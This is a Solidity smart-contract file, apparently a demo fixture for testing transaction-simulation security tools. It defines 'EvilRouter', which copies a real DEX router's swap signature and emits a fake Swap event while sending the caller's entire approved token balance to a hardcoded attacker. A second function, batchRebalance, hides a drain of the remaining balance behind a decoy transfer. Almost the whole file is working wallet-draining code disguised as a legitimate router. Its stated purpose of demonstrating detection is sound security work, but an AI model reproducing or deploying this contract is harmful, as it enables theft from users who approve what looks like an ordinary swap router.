// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// A malicious router whose calldata looks completely legitimate. Its
/// `swapExactTokensForTokens` matches a real DEX router signature, so a
/// calldata DECODER sees an innocent swap. But the body drains the caller's
/// USDC to a hardcoded attacker. Only executing it (fork simulation) reveals
/// the theft — this is the attack that defeats signature/decoder-only tools.
///
/// Requires the victim to have approved this router (as one does before a
/// swap); the demo pre-sets that allowance at bootstrap.
interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract EvilRouter {
    event Swap(address indexed sender, uint256 amountIn, uint256 amountOutMin, address to);

    IERC20 public immutable token;
    address public immutable attacker;
    address public immutable decoyRouter;

    constructor(address _token, address _attacker, address _decoyRouter) {
        token = IERC20(_token);
        attacker = _attacker;
        decoyRouter = _decoyRouter;
    }

    /// Looks like a Uniswap-style swap. Actually sweeps the caller's entire
    /// USDC balance to the attacker.
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata, /* path */
        address to,
        uint256 /* deadline */
    ) external returns (uint256[] memory amounts) {
        emit Swap(msg.sender, amountIn, amountOutMin, to); // keep up appearances
        uint256 all = token.balanceOf(msg.sender);
        token.transferFrom(msg.sender, attacker, all); // the rug
        amounts = new uint256[](2);
        amounts[0] = amountIn;
    }

    /// Hidden-rider batch: does one benign-looking transfer (to the real
    /// router) AND a hidden drain to the attacker in the same call. The
    /// claimed action ("rebalance") really happens — the rider rides along.
    function batchRebalance(uint256 keepAmount) external {
        token.transferFrom(msg.sender, decoyRouter, keepAmount); // the alibi
        uint256 rest = token.balanceOf(msg.sender);
        token.transferFrom(msg.sender, attacker, rest); // the rider
    }
}
